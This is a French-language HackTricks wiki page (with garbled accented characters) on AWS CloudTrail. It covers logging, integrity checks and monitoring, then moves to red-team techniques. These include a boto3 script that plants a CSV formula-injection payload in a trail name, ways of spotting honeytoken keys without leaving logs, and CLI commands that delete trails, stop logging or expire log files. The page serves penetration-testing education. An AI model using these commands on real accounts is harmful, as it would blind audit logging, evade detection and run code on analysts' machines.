# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **enregistre et surveille l'activit√© au sein de votre environnement AWS**. Il capture des **journaux d'√©v√©nements** d√©taill√©s, y compris qui a fait quoi, quand et d'o√π, pour toutes les interactions avec les ressources AWS. Cela fournit une trace d'audit des changements et des actions, aidant √† l'analyse de la s√©curit√©, √† l'audit de conformit√© et au suivi des changements de ressources. CloudTrail est essentiel pour comprendre le comportement des utilisateurs et des ressources, am√©liorer les postures de s√©curit√© et garantir la conformit√© r√©glementaire.

Chaque √©v√©nement enregistr√© contient :

* Le nom de l'API appel√©e : `eventName`
* Le service appel√© : `eventSource`
* L'heure : `eventTime`
* L'adresse IP : `SourceIPAddress`
* La m√©thode de l'agent : `userAgent`. Exemples :
* Signing.amazonaws.com - Depuis la console de gestion AWS
* console.amazonaws.com - Utilisateur root du compte
* lambda.amazonaws.com - AWS Lambda
* Les param√®tres de la requ√™te : `requestParameters`
* Les √©l√©ments de r√©ponse : `responseElements`

Les √©v√©nements sont √©crits dans un nouveau fichier journal **environ toutes les 5 minutes dans un fichier JSON**, ils sont conserv√©s par CloudTrail et enfin, les fichiers journaux sont **livr√©s √† S3 environ 15 minutes apr√®s**.\
Les journaux de CloudTrail peuvent √™tre **agr√©g√©s √† travers les comptes et les r√©gions.**\
CloudTrail permet d'utiliser **l'int√©grit√© des fichiers journaux afin de pouvoir v√©rifier que vos fichiers journaux sont rest√©s inchang√©s** depuis que CloudTrail vous les a livr√©s. Il cr√©e un hachage SHA-256 des journaux √† l'int√©rieur d'un fichier de r√©sum√©. Un hachage sha-256 des nouveaux journaux est cr√©√© chaque heure.\
Lors de la cr√©ation d'un Trail, les s√©lecteurs d'√©v√©nements vous permettront d'indiquer le type d'√©v√©nements √† enregistrer : √©v√©nements de gestion, de donn√©es ou d'informations.

Les journaux sont sauvegard√©s dans un bucket S3. Par d√©faut, le chiffrement c√¥t√© serveur est utilis√© (SSE-S3) donc AWS d√©chiffrera le contenu pour les personnes qui y ont acc√®s, mais pour une s√©curit√© suppl√©mentaire, vous pouvez utiliser SSE avec KMS et vos propres cl√©s.

Les journaux sont stock√©s dans un **bucket S3 avec ce format de nom** :

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Le BucketName √©tant : **`aws-cloudtrail-logs-<accountid>-<random>`**
* Exemple : **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

√Ä l'int√©rieur de chaque dossier, chaque journal aura un **nom suivant ce format** : **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Convention de nommage des fichiers journaux

![](<../../../../.gitbook/assets/image (122).png>)

De plus, **les fichiers de r√©sum√© (pour v√©rifier l'int√©grit√© des fichiers)** seront √† l'int√©rieur du **m√™me bucket** dans :

![](<../../../../.gitbook/assets/image (195).png>)

### Agr√©ger des journaux de plusieurs comptes

* Cr√©ez un Trail dans le compte AWS o√π vous souhaitez que les fichiers journaux soient livr√©s
* Appliquez des autorisations au bucket S3 de destination permettant l'acc√®s inter-comptes pour CloudTrail et autorisez chaque compte AWS qui a besoin d'acc√®s
* Cr√©ez un nouveau Trail dans les autres comptes AWS et s√©lectionnez d'utiliser le bucket cr√©√© √† l'√©tape 1

Cependant, m√™me si vous pouvez sauvegarder tous les journaux dans le m√™me bucket S3, vous ne pouvez pas agr√©ger les journaux CloudTrail de plusieurs comptes dans des journaux CloudWatch appartenant √† un seul compte AWS.

{% hint style="danger" %}
N'oubliez pas qu'un compte peut avoir **diff√©rents Trails** de CloudTrail **activ√©s** stockant les m√™mes (ou diff√©rents) journaux dans diff√©rents buckets.
{% endhint %}

### CloudTrail de tous les comptes d'organisation en 1

Lors de la cr√©ation d'un CloudTrail, il est possible d'indiquer d'activer CloudTrail pour tous les comptes de l'organisation et de r√©cup√©rer les journaux dans un seul bucket :

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

De cette mani√®re, vous pouvez facilement configurer CloudTrail dans toutes les r√©gions de tous les comptes et centraliser les journaux dans 1 compte (que vous devez prot√©ger).

### V√©rification des fichiers journaux

Vous pouvez v√©rifier que les journaux n'ont pas √©t√© alt√©r√©s en ex√©cutant

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Journaux vers CloudWatch

**CloudTrail peut automatiquement envoyer des journaux √† CloudWatch afin que vous puissiez d√©finir des alertes qui vous avertissent lorsque des activit√©s suspectes sont effectu√©es.**\
Notez que pour permettre √† CloudTrail d'envoyer les journaux √† CloudWatch, un **r√¥le** doit √™tre cr√©√© pour autoriser cette action. Si possible, il est recommand√© d'utiliser le r√¥le par d√©faut d'AWS pour effectuer ces actions. Ce r√¥le permettra √† CloudTrail de :

* CreateLogStream : Cela permet de cr√©er des flux de journaux CloudWatch
* PutLogEvents : Livrer les journaux CloudTrail au flux de journaux CloudWatch

### Historique des √©v√©nements

L'historique des √©v√©nements CloudTrail vous permet d'inspecter dans un tableau les journaux qui ont √©t√© enregistr√©s :

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** analyse automatiquement les √©v√©nements de gestion d'√©criture des pistes CloudTrail et vous **alerte** sur des **activit√©s inhabituelles**. Par exemple, s'il y a une augmentation des √©v√©nements `TerminateInstance` qui diff√®re des bases √©tablies, vous le verrez comme un √©v√©nement Insight. Ces √©v√©nements facilitent **la recherche et la r√©ponse √† des activit√©s API inhabituelles** comme jamais auparavant.

Les insights sont stock√©s dans le m√™me bucket que les journaux CloudTrail dans : `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### S√©curit√©

| Int√©grit√© des fichiers journaux CloudTrail | <ul><li>Valider si les journaux ont √©t√© alt√©r√©s (modifi√©s ou supprim√©s)</li><li><p>Utilise des fichiers de r√©sum√© (cr√©e un hachage pour chaque fichier)</p><ul><li>Hachage SHA-256</li><li>SHA-256 avec RSA pour la signature num√©rique</li><li>cl√© priv√©e d√©tenue par Amazon</li></ul></li><li>Prend 1 heure pour cr√©er un fichier de r√©sum√© (fait √† l'heure chaque heure)</li></ul> |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Arr√™ter l'acc√®s non autoris√©               | <ul><li><p>Utiliser des politiques IAM et des politiques de bucket S3</p><ul><li>√©quipe de s√©curit√© ‚Äî> acc√®s administrateur</li><li>auditeurs ‚Äî> acc√®s en lecture seule</li></ul></li><li>Utiliser SSE-S3/SSE-KMS pour chiffrer les journaux</li></ul>                                                                                                                                        |
| Pr√©venir la suppression des fichiers journaux | <ul><li>Restreindre l'acc√®s √† la suppression avec des politiques IAM et des politiques de bucket</li><li>Configurer la suppression MFA S3</li><li>Valider avec la validation des fichiers journaux</li></ul>                                                                                                                                                                                            |

## Conseiller d'acc√®s

Le Conseiller d'acc√®s AWS s'appuie sur les 400 derniers jours de journaux **CloudTrail AWS pour recueillir ses insights**. CloudTrail capture un historique des appels API AWS et des √©v√©nements connexes effectu√©s dans un compte AWS. Le Conseiller d'acc√®s utilise ces donn√©es pour **montrer quand les services ont √©t√© acc√©d√©s pour la derni√®re fois**. En analysant les journaux CloudTrail, le Conseiller d'acc√®s peut d√©terminer quels services AWS un utilisateur ou un r√¥le IAM a acc√©d√©s et quand cet acc√®s a eu lieu. Cela aide les administrateurs AWS √† prendre des d√©cisions √©clair√©es sur **l'affinement des autorisations**, car ils peuvent identifier les services qui n'ont pas √©t√© acc√©d√©s pendant de longues p√©riodes et potentiellement r√©duire des autorisations trop larges en fonction des mod√®les d'utilisation r√©els.

{% hint style="success" %}
Par cons√©quent, le Conseiller d'acc√®s informe sur **les autorisations inutiles accord√©es aux utilisateurs** afin que l'administrateur puisse les supprimer.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### √ânum√©ration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Injection CSV**

Il est possible d'effectuer une injection CSV dans CloudTrail qui ex√©cutera du code arbitraire si les journaux sont export√©s en CSV et ouverts avec Excel.\
Le code suivant g√©n√©rera une entr√©e de journal avec un mauvais nom de Trail contenant la charge utile :
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Pour plus d'informations sur les injections CSV, consultez la page :

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Pour plus d'informations sur cette technique sp√©cifique, consultez [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Contourner la D√©tection**

### HoneyTokens **contournement**

Les Honeytokens sont cr√©√©s pour **d√©tecter l'exfiltration d'informations sensibles**. Dans le cas d'AWS, ce sont des **cl√©s AWS dont l'utilisation est surveill√©e**. Si quelque chose d√©clenche une action avec cette cl√©, alors quelqu'un doit avoir vol√© cette cl√©.

Cependant, les Honeytokens comme ceux cr√©√©s par [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) utilisent soit un nom de compte reconnaissable, soit le m√™me ID de compte AWS pour tous leurs clients. Par cons√©quent, si vous pouvez obtenir le nom du compte et/ou l'ID du compte sans faire cr√©er de journal par Cloudtrail, **vous pourriez savoir si la cl√© est un honeytoken ou non**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) a quelques r√®gles pour d√©tecter si une cl√© appartient √† [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Si **`canarytokens.org`** appara√Æt dans le nom du r√¥le ou si l'ID de compte **`534261010715`** appara√Æt dans le message d'erreur.
* En les testant plus r√©cemment, ils utilisent le compte **`717712589309`** et ont toujours la cha√Æne **`canarytokens.com`** dans le nom.
* Si **`SpaceCrab`** appara√Æt dans le nom du r√¥le dans le message d'erreur.
* **SpaceSiren** utilise des **uuids** pour g√©n√©rer des noms d'utilisateur : `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Si le **nom semble g√©n√©r√© al√©atoirement**, il y a de fortes probabilit√©s que ce soit un HoneyToken.

#### Obtenir l'ID de compte √† partir de l'ID de cl√©

Vous pouvez obtenir l'**ID de compte** √† partir de l'**encod√©** √† l'int√©rieur de la **cl√© d'acc√®s** comme [**expliqu√© ici**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) et v√©rifier l'ID de compte avec votre liste de comptes Honeytokens AWS :
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**recherche originale**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Ne pas g√©n√©rer de journal

La technique la plus efficace pour cela est en fait une simple. Utilisez simplement la cl√© que vous venez de trouver pour acc√©der √† un service dans votre propre compte d'attaquant. Cela fera en sorte que **CloudTrail g√©n√®re un journal dans VOTRE PROPRE compte AWS et non dans celui des victimes**.

Le fait est que la sortie vous montrera une erreur indiquant l'ID du compte et le nom du compte, donc **vous pourrez voir si c'est un Honeytoken**.

#### Services AWS sans journaux

Dans le pass√©, il y avait certains **services AWS qui n'envoient pas de journaux √† CloudTrail** (trouvez une [liste ici](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Certains de ces services **r√©pondront** avec une **erreur** contenant l'**ARN du r√¥le de cl√©** si quelqu'un non autoris√© (la cl√© honeytoken) essaie d'y acc√©der.

De cette mani√®re, un **attaquant peut obtenir l'ARN de la cl√© sans d√©clencher aucun journal**. Dans l'ARN, l'attaquant peut voir l'**ID du compte AWS et le nom**, il est facile de conna√Ætre l'ID et les noms des comptes des entreprises HoneyToken, ainsi un attaquant peut identifier si le token est un HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Notez que toutes les API publiques d√©couvertes ne cr√©ant pas de journaux CloudTrail sont maintenant corrig√©es, donc vous devrez peut-√™tre trouver les v√¥tres...

Pour plus d'informations, consultez la [**recherche originale**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Acc√©der √† une infrastructure tierce

Certains services AWS **g√©n√©reront une infrastructure** telle que des **bases de donn√©es** ou des **clusters Kubernetes** (EKS). Un utilisateur **parlant directement √† ces services** (comme l'API Kubernetes) **n'utilisera pas l'API AWS**, donc CloudTrail ne pourra pas voir cette communication.

Par cons√©quent, un utilisateur ayant acc√®s √† EKS qui a d√©couvert l'URL de l'API EKS pourrait g√©n√©rer un token localement et **parler directement au service API sans √™tre d√©tect√© par Cloudtrail**.

Plus d'infos dans :

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modification de la configuration de CloudTrail

#### Supprimer des pistes
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Arr√™ter les pistes
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### D√©sactiver la journalisation multi-r√©gion

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### D√©sactiver la journalisation par s√©lecteurs d'√©v√©nements

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Dans le premier exemple, un seul s√©lecteur d'√©v√©nements est fourni sous forme de tableau JSON avec un seul objet. Le `"ReadWriteType": "ReadOnly"` indique que le **s√©lecteur d'√©v√©nements ne doit capturer que des √©v√©nements en lecture seule** (donc les insights de CloudTrail **ne v√©rifieront pas les** √©v√©nements d'√©criture par exemple).

Vous pouvez personnaliser le s√©lecteur d'√©v√©nements en fonction de vos exigences sp√©cifiques.

#### Suppression des journaux via la politique de cycle de vie S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modification de la configuration du bucket

* Supprimer le bucket S3
* Changer la politique du bucket pour refuser toute √©criture du service CloudTrail
* Ajouter une politique de cycle de vie au bucket S3 pour supprimer des objets
* D√©sactiver la cl√© KMS utilis√©e pour chiffrer les journaux CloudTrail

### Ransomware Cloudtrail

#### Ransomware S3

Vous pourriez **g√©n√©rer une cl√© asym√©trique** et faire en sorte que **CloudTrail chiffre les donn√©es** avec cette cl√© et **supprimer la cl√© priv√©e** afin que le contenu de CloudTrail ne puisse pas √™tre r√©cup√©r√©.\
C'est essentiellement un **ransomware S3-KMS** expliqu√© dans :

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

C'est un moyen plus simple d'effectuer l'attaque pr√©c√©dente avec des exigences de permissions diff√©rentes :

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **R√©f√©rences**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
